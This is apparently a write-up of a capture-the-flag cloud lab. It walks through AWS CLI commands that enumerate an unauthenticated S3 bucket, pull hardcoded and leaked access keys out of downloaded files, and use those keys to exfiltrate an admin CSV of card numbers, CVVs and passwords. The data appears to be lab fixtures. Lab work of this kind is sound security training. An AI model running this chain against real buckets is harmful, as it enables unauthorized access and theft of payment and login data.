---
title: "AWS S3 Enumeration "
date: 2026-01-8
categories: [PwnLab, AWS]
tags: [pwnlab, aws, s3]
---


This lab focuses on identifying and exploiting common Amazon S3 misconfigurations.
The objective is to enumerate a publicly accessible S3 bucket, identify exposed files,
and understand the security impact of improper access controls.

## Scenario

It's your first day on the red team, and you've been tasked with examining a website that was found in a phished employee's bookmarks. Check it out and see where it leads! In scope is the company's infrastructure, including cloud services.

## Initial Enumeration

Inspecting the page source reveals static assets hosted on Amazon S3, indicating
Inspecting the page source reveals that static assets are hosted on Amazon S3, suggesting the presence of a potentially misconfigured bucket.

![Image description](/assets/images/aws-en-1.png)

From the source, we identify the following S3 object URL:
```sh
https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css
```
the bucket name was **dev.huge-logistics.com**

## S3 Bucket Enumeration

Using the AWS CLI with no sign request 

```sh
➜  ~ aws s3 ls s3://dev.huge-logistics.com --no-sign-request
                           PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 22:30:47       5347 index.html
```
The bucket allows public listing

### Attempting to List the admin Directory
```sh
➜  ~ aws s3 ls s3://dev.huge-logistics.com/admin/ --no-sign-request

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```
While listing is blocked here, other directories may still be accessible.

Investigating the shared Directory
```sh
➜  ~ aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
2023-10-16 20:38:33          0 
2023-10-16 20:39:01        993 hl_migration_project.zip
```
Download and extract the archive:
```sh
➜  s3-enum aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
download: s3://dev.huge-logistics.com/shared/hl_migration_project.zip to ./hl_migration_project.zip
➜  s3-enum unzip hl_migration_project.zip 
Archive:  hl_migration_project.zip
  inflating: migrate_secrets.ps1 
```
## Credential Exposure

```sh
➜  s3-enum cat migrate_secrets.ps1 
# AWS Configuration
$accessKey = "A*******************"
$secretKey = "****************************"
$region = "us-east-1"

# Set up AWS hardcoded credentials
Set-AWSCredentials -AccessKey $accessKey -SecretKey $secretKey
```
## aws cli configure

```sh
➜  s3-enum aws configure --profile s3-enum
AWS Access Key ID [None]: AKIA****************
AWS Secret Access Key [None]: ************gb9
Default region name [None]: us-east-1
Default output format [None]:
```
Validate the credentials this command is like in linux whoami command

```sh
➜  s3-enum aws sts get-caller-identity --profile s3-enum |jq
{
  "UserId": "AIDA3SFMDAPOYPM3X2TB7",
  "Account": "794929857501",
  "Arn": "arn:aws:iam::794929857501:user/pam-test"
}
```
With authenticated access, we can list the previously restricted admin directory

```sh
➜  s3-enum aws s3 ls s3://dev.huge-logistics.com/admin/ --profile s3-enum     
2023-10-16 20:38:38          0 
2024-12-02 20:27:44         32 flag.txt
2023-10-17 01:54:07       2425 website_transactions_export.csv
➜  s3-enum aws s3 sync s3://dev.huge-logistics.com/admin/ . --profile s3-enum
download failed: s3://dev.huge-logistics.com/admin/website_transactions_export.csv to ./website_transactions_export.csv An error occurred (AccessDenied) when calling the GetObject operation: User: arn:aws:iam::794929857501:user/pam-test is not authorized to perform: s3:GetObject on resource: "arn:aws:s3:::dev.huge-logistics.com/admin/website_transactions_export.csv" with an explicit deny in a resource-based policy
download failed: s3://dev.huge-logistics.com/admin/flag.txt to ./flag.txt An error occurred (AccessDenied) when calling the GetObject operation: User: arn:aws:iam::794929857501:user/pam-test is not authorized to perform: s3:GetObject on resource: "arn:aws:s3:::dev.huge-logistics.com/admin/flag.txt" with an explicit deny in a resource-based policy
```
we can view the admin folder but can't download the folder
let's try onther folder called migration-files

```sh
➜  s3-enum aws s3 sync s3://dev.huge-logistics.com/migration-files/ . --profile s3-enum        
download: s3://dev.huge-logistics.com/migration-files/test-export.xml to ./test-export.xml
download: s3://dev.huge-logistics.com/migration-files/AWS Secrets Manager Migration - Implementation.pdf to ./AWS Secrets Manager Migration - Implementation.pdf
download: s3://dev.huge-logistics.com/migration-files/AWS Secrets Manager Migration - Discovery & Design.pdf to ./AWS Secrets Manager Migration - Discovery & Design.pdf
```
in the test-export.xml that contain AWS IT Admin cerds

```xml
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>AKIA************FCD</AccessKeyID>
        <SecretAccessKey>************6jP</SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
```
## aws cli configure 

```sh
➜  s3-enum aws configure --profile aws_it_admin
AWS Access Key ID [None]: AKIA************FCD
AWS Secret Access Key [None]: ************6jP
Default region name [None]: 
Default output format [None]: 
```
## Full Access to Restricted Data
```sh
 ➜  s3-enum aws s3 ls s3://dev.huge-logistics.com/admin/ --profile aws_it_admin                         
2023-10-16 20:38:38          0 
2024-12-02 20:27:44         32 flag.txt
2023-10-17 01:54:07       2425 website_transactions_export.csv
```
Inspecting the exported data
```sh
➜  s3-enum aws s3 sync s3://dev.huge-logistics.com/admin/ . --profile aws_it_admin
download: s3://dev.huge-logistics.com/admin/flag.txt to ./flag.txt
download: s3://dev.huge-logistics.com/admin/website_transactions_export.csv to ./website_transactions_export.csv
```
```sh
➜  s3-enum cat website_transactions_export.csv 
network,credit_card_number,cvv,expiry_date,card_holder_name,validation,username,password,ip_address
Visa,4055497191304,386,5/2021,Hunter Miller,,hunter_m,password123,34.56.78.90
Visa,4055491339081,492,8/2021,Jayden Adams,,jay_adams,jayden2023,157.89.34.56
Visa,4055491511051,244,10/2025,Jose Baker,,joseBaker24,jose@pass,212.45.67.89
Visa,4313504070320,984,3/2025,Gabriel Phillips,,gabrielP,welcome2025,58.67.34.23
Visa,4313504750869252,522,5/2024,Joseph Thomas,,joethomas,joe!pass,94.23.45.67
Visa,4313501801459893,585,5/2021,Chloe Nelson,,chloe_n,summer21,71.23.45.89
Visa,4313506927832,748,4/2025,Brianna Brown,,briBrown,ilovebri,102.178.23.45
Visa,4313508703687539,854,9/2021,Jose Perez,,jperez,jose*pass,145.89.23.67
```
This demonstrates the potential impact of S3 misconfigurations combined with credential leakage.